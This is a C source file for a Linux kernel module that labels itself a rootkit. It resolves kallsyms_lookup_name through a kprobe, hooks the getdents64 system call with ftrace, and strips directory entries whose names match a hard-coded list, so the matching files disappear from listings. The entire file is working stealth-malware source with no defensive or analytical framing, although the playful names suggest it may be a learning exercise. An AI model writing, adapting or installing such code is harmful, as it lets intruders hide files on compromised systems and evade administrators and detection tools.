#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h>

// Forward declare functions
static void hook_getdents64(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs);
static long filter_dirents(void __user *user_dir, long n, bool is_64);
static bool should_hide_name(const char *curr_name);

static asmlinkage long fake_getdents64(const struct pt_regs *regs);
static asmlinkage long (*real_getdents64)(const struct pt_regs *regs);

// Function pointer for our symbol searching function
static unsigned long (*kallsyms_lookup_name_fn)(const char *name);

const char *hidden_patterns[] = {
    "monkey",
    "prince_sucks",
    "blahblah",
    NULL
};

#ifndef HAVE_LINUX_DIRENT
struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[];
};
#endif

static struct ftrace_ops ops = {
    .func = hook_getdents64,
    .flags = FTRACE_OPS_FL_SAVE_REGS |
             FTRACE_OPS_FL_RECURSION |
             FTRACE_OPS_FL_IPMODIFY,
};

static void hook_getdents64(unsigned long ip,
                            unsigned long parent_ip,
                            struct ftrace_ops *ops,
                            struct ftrace_regs *fregs
                        )
{
    pr_info("[rootkit] - called hook_getdents64\n");

    struct pt_regs *regs = ftrace_get_regs(fregs);
    if (!regs)
        return;

    // Skip the actual syscall by updating instruction pointer
    regs->ip = (unsigned long)fake_getdents64;
}

static asmlinkage long fake_getdents64(const struct pt_regs *regs)
{
    pr_info("[rootkit] - called fake_getdents64\n");
    long ret;

    // 2. Call real_getdents64
    ret = real_getdents64(regs);
    if (ret <= 0) return ret;

    // 3. Modify results
    return filter_dirents((void __user *)regs->si, ret, true);
}

static long filter_dirents(void __user *user_dir, long n, bool is_64)
{
    char *kernel_buf;
    char *filtered_buf;
    long offset = 0;
    long new_offset = 0;
    long result = n;

    if (n <= 0)
        return n;

    kernel_buf = kmalloc(n, GFP_KERNEL);
    if (!kernel_buf)
        return -ENOMEM;

    if (copy_from_user(kernel_buf, user_dir, n)) {
        kfree(kernel_buf);
        return -EFAULT;
    }

    filtered_buf = kzalloc(n, GFP_KERNEL);
    if (!filtered_buf) {
        kfree(kernel_buf);
        return -ENOMEM;
    }

    while (offset < result) {
        char *curr_name;
        unsigned long reclen;
        void *curr_entry = kernel_buf + offset;

        if (is_64) {
            struct linux_dirent64 *d = (struct linux_dirent64*)curr_entry;
            curr_name = d->d_name;
            reclen = d->d_reclen;
        } else {
            struct linux_dirent *d = (struct linux_dirent*)curr_entry;
            curr_name = d->d_name;
            reclen = d->d_reclen;
        }

        if (!should_hide_name(curr_name)) {
            if (new_offset + reclen <= n) {
                memcpy(filtered_buf + new_offset, curr_entry, reclen);
                new_offset += reclen;
            }
        }

        offset += reclen;
    }

    if (copy_to_user(user_dir, filtered_buf, new_offset)) {
        kfree(kernel_buf);
        kfree(filtered_buf);
        return -EFAULT;
    }

    kfree(kernel_buf);
    kfree(filtered_buf);
    return new_offset;
}

bool should_hide_name(const char *name)
{
    if (!name)
        return false;

    for (int i = 0; hidden_patterns[i] != NULL; i++) {
        if (strstr(name, hidden_patterns[i])) {
            return true;
        }
    }

    return false;
}


int init_rootkit(void)
{
    pr_info("[rootkit] - Hello\n");

    // Register a kprobe to find our symbol searching function
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name",
    };

    register_kprobe(&kp);
    kallsyms_lookup_name_fn = (void *)kp.addr;
    unregister_kprobe(&kp);

    // Use our symbol search function to find __x64_sys_getdents64
    unsigned long target = kallsyms_lookup_name_fn("__x64_sys_getdents64");
    if (!target) {
        pr_info("[rootkit] __x64_sys_getdents64 lookup failed\n");
        return -EFAULT;
    }
    real_getdents64 = (void*)(target + MCOUNT_INSN_SIZE);

    pr_info("[rootkit] kallsyms_lookup_name = %px\n", kallsyms_lookup_name_fn);
    pr_info("[rootkit] __x64_sys_getdents64 = %px\n", real_getdents64);

    // Register a hook
    ftrace_set_filter(&ops, "__x64_sys_getdents64", 0, 0);
    register_ftrace_function(&ops);
    
    return 0;
}

void exit_rootkit(void)
{
    // Unregister hook
    unregister_ftrace_function(&ops);
    ftrace_set_filter(&ops, NULL, 0, 1);

    pr_info("[rootkit] - Bye\n");
}

module_init(init_rootkit);
module_exit(exit_rootkit);
MODULE_LICENSE("GPL");
